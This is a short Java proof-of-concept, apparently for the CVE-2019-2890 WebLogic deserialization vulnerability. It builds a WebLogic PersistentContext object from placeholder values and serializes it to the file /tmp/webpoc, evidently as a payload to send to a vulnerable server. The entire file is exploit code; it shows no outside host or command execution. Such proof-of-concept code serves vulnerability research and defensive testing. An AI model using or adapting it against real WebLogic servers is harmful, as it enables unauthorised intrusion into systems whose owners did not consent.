package weblogic.wsee.jaxws.persistence;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class CVE_2019_2890 {
    public static void main(String[] args) throws Exception{
        String var1 = "flight";
        Map<String, Serializable> var2 = new HashMap<String, Serializable>();
        Set<String> var3 = new HashSet<String>();
        PersistentContext context = new PersistentContext(var1, var2, var3, var2, var2);
        FileOutputStream fileOutputStream = new FileOutputStream("/tmp/webpoc");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(context);
    }
}
